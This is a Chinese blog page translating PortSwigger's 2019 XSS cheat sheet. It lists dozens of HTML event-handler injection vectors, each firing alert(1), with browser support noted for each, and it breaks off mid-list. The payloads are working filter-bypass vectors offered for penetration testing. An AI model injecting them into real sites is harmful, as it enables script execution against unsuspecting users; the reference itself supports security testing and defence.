

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚">
  <meta name="author" content="iceH">
  <meta name="keywords" content="">
  <title>跨站脚本（XSS）备忘录-2019版 - iceH’s Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"www.secice.cn","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="跨站脚本（XSS）备忘录-2019版">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2019-12-16 14:09" pubdate>
        2019年12月16日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      7.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      121
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">跨站脚本（XSS）备忘录-2019版</h1>
            
            <div class="markdown-body">
              <p>这是一份跨站脚本（XSS）备忘录，收集了大量的XSS攻击向量，包含了各种事件处理、通讯协议、特殊属性、限制字符、编码方式、沙箱逃逸等技巧，可以帮助渗透测试人员绕过WAF和过滤机制。</p>
<p>译者注：原文由Portswigger公司的Web安全学院于2019年定期更新，对的，就是那家开发著名渗透工具Burp suite的公司，最后更新时间：2019年11月8日星期五10:58:07。</p>
<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p><strong>不需要用户交互的事件处理程序</strong></p>
<p>激活元素时触发(IE)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onactivate</span>=alert(1)&gt;&lt;/a&gt;</code></pre>

<p>页面打印后触发（Chrome、Firefox、IE)</p>
<a id="more"></a>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onafterprint</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>CSS动画取消时触发(Firefox)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;<span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">left</span>:<span class="hljs-number">0</span>;&#125;<span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">left</span>: <span class="hljs-number">1000px</span>;&#125;&#125;<span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">animation</span>:<span class="hljs-number">10s</span> ease-in-out <span class="hljs-number">0s</span> <span class="hljs-number">1</span> x;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute;&quot;</span> <span class="hljs-attr">onanimationcancel</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>CSS动画结束时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-name:x&quot;</span> <span class="hljs-attr">onanimationend</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>重复CSS动画时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> slidein &#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot;</span> <span class="hljs-attr">onanimationiteration</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>CSS动画开始时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-name:x&quot;</span> <span class="hljs-attr">onanimationstart</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>在激活元素之前触发（IE）</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onbeforeactivate</span>=alert(1)&gt;&lt;/a&gt;</code></pre>

<p>在停用元素之前触发（IE）</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onbeforedeactivate</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre>

<p>在页面打印前触发（Chrome、Firefox、IE)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onbeforeprint</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>网址更改后触发（Chrome）</p>
<pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onbegin</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s&gt;</code></pre>

<p>svg动画开始时触发（Chrome、Firefox、Safari）</p>
<pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onbegin</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s&gt;</code></pre>

<p>当元素失去焦点时触发（Chrome、IE、Safari）</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre>

<p>选框弹跳时触发（Firefox、IE）</p>
<pre><code class="hljs routeros">&lt;marquee <span class="hljs-attribute">width</span>=1 <span class="hljs-attribute">loop</span>=1 <span class="hljs-attribute">onbounce</span>=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre>

<p>如果资源可以播放则触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">oncanplay</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;video <span class="hljs-attribute">oncanplaythrough</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validvideo.mp4&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;&lt;/video&gt;</code></pre>

<p>停用元素时触发（IE）</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">ondeactivate</span>=alert(1)&gt;&lt;/a&gt;&lt;input <span class="hljs-attribute">id</span>=y autofocus&gt;</code></pre>

<p>资源播放完毕时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio controls autoplay <span class="hljs-attribute">onended</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>/<span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>选框完成时触发（Firefox、IE)</p>
<pre><code class="hljs routeros">&lt;marquee <span class="hljs-attribute">width</span>=1 <span class="hljs-attribute">loop</span>=1 <span class="hljs-attribute">onfinish</span>=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre>

<p>当元素具有焦点时触发（Chrome、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onfocus</span>=alert(1)&gt;&lt;/a&gt;</code></pre>

<p>当元素具有焦点时触发（Chrome、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">tabindex</span>=1 <span class="hljs-attribute">onfocusin</span>=alert(1)&gt;&lt;/a&gt;</code></pre>

<p>当元素失去焦点时触发（Chrome、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onfocusout</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span></code></pre>

<p>如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">onhashchange</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</code></pre>

<p>加载元素时触发（Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>加载第一帧时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">onloadeddata</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>加载元数据时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onloadedmetadata</span>=alert(1)&gt; &lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>当元素完成加载时触发（Firefox)</p>
<pre><code class="hljs routeros">&lt;image <span class="hljs-attribute">src</span>=validimage.png <span class="hljs-attribute">onloadend</span>=alert(1)&gt;</code></pre>

<p>当元素开始加载时触发（Firefox)</p>
<pre><code class="hljs routeros">&lt;image <span class="hljs-attribute">src</span>=validimage.png <span class="hljs-attribute">onloadstart</span>=alert(1)&gt;</code></pre>

<p>当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onmessage</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>显示页面时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpageshow</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>播放资源时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onplay</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>触发资源正在播放（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay <span class="hljs-attribute">onplaying</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>历史记录更改时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onpopstate</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>svg动画重复时触发（Chrome、Firefox、Safari)</p>
<pre><code class="hljs routeros">&lt;svg&gt;&lt;animate <span class="hljs-attribute">onrepeat</span>=alert(1) <span class="hljs-attribute">attributeName</span>=x <span class="hljs-attribute">dur</span>=1s <span class="hljs-attribute">repeatCount</span>=2 /&gt;</code></pre>

<p>调整窗口大小时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">onresize</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</code></pre>

<p>页面滚动时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onscroll</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">height:1000px</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>

<p>选框开始时触发（Firefox、IE)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">alert(1)</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">marquee</span>&gt;</span></code></pre>

<p>更改时间轴时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio controls autoplay <span class="hljs-attribute">ontimeupdate</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>展开详细信息标签时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">open</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></code></pre>

<p>CSS过渡取消时触发（Firefox)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">color</span>: red;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:color 10s&quot;</span> <span class="hljs-attr">ontransitioncancel</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>CSS过渡结束时触发（Chrome)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">color</span>:red;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:color 1s&quot;</span> <span class="hljs-attr">ontransitionend</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>CSS过渡开始时触发（Firefox)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-pseudo">:target</span> &#123;<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">180deg</span>);&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transition:transform 2s&quot;</span> <span class="hljs-attr">ontransitionrun</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>未履行承诺时触发（Firefox)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onunhandledrejection</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">fetch(<span class="hljs-string">&#x27;//xyz&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>等待数据时触发（IE）</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">autoplay</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">onwaiting</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;validvideo.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">video/mp4</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span></code></pre>

<p><strong>需要用户交互的事件处理程序</strong></p>
<p>右键单击或使用鼠标中键时触发（Chrome、Firefox)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onauxclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforecopy</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforecut</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要粘贴一段文字（IE）</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onbeforepaste</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要属性值的变化（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onchange</span>=alert(1) <span class="hljs-attribute">value</span>=xss&gt;</code></pre>

<p>需要点击一下元素（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncontextmenu</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncopy</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">oncut</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>双击元素时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondblclick</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>触发拖动元素（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondrag</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragend</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragenter</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragleave</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>触发拖动元素（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drag me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondragover</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drop here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragstart</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre>

<p>触发删除可拖动元素（Chrome、Firefox、IE、Safari)</p>
